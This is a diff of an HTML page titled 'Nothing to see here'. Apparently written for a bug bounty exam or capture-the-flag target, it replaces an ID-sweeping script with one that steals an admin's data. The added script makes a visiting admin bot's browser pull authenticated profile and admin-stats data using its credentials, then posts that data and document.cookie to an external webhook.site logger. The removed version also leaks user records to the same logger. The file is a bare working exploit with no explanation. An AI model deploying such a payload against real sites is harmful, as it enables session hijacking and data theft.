@@ -1,33 +1,52 @@
-<script>
-    const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
-    const apiBase = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile/";
-    const base = "69da4749adf0dbb976ce8e"; 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Nothing to see here</title>
+</head>
+<body>
+    <script>
+        const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
+        const apiBase = "https://api-bugbounty-exam.hashacademy.co/api";
 
-    async function fastSweep() {
-        const hex = "0123456789abcdef";
-        
-        // We will only sweep a smaller, targeted range to ensure it finishes 
-        // before the bot closes the page.
-        for (let h of hex) {
-            let target = base + "3" + h; // Adjusting the "3" to match your found ID range
+        async function startExploit() {
+            const results = {};
+
+            // 1. Grab the Admin's "Self" data (The most likely place for a hidden flag)
             try {
-                const response = await fetch(apiBase + target, { credentials: "include" });
-                const json = await response.json();
-                
-                if (json.success) {
-                    // We send the result immediately
-                    await fetch(`${logger}?found=${target}`, {
-                        method: "POST",
-                        mode: "no-cors", // Use no-cors to bypass potential preflight delays
-                        body: JSON.stringify(json.data.user)
-                    });
-                }
-            } catch (e) {}
-        }
-        
-        // Final signal so you know the bot finished the script
-        fetch(logger + "?status=DONE");
-    }
+                const meRes = await fetch(`${apiBase}/auth/me`, { credentials: "include" });
+                results.authMe = await meRes.json();
+            } catch (e) { results.error_me = e.message; }
 
-    fastSweep();
-</script>
+            // 2. Grab the Admin's Profile data
+            try {
+                const profileRes = await fetch(`${apiBase}/auth/profile`, { credentials: "include" });
+                results.profile = await profileRes.json();
+            } catch (e) { results.error_profile = e.message; }
+
+            // 3. Try to access the Admin Dashboard data directly
+            try {
+                const adminRes = await fetch(`${apiBase}/admin/stats`, { credentials: "include" });
+                results.adminStats = await adminRes.json();
+            } catch (e) { results.error_admin = e.message; }
+
+            // 4. Send EVERYTHING to your Webhook in one big bundle
+            await fetch(logger, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                    type: "ADMIN_FULL_EXFIL",
+                    timestamp: new Date().toISOString(),
+                    data: results,
+                    cookies: document.cookie // Just in case it's not HttpOnly
+                })
+            });
+
+            // Final signal
+            fetch(logger + "?status=COMPLETE");
+        }
+
+        startExploit();
+    </script>
+    <h1>Loading...</h1>
+</body>
+</html>
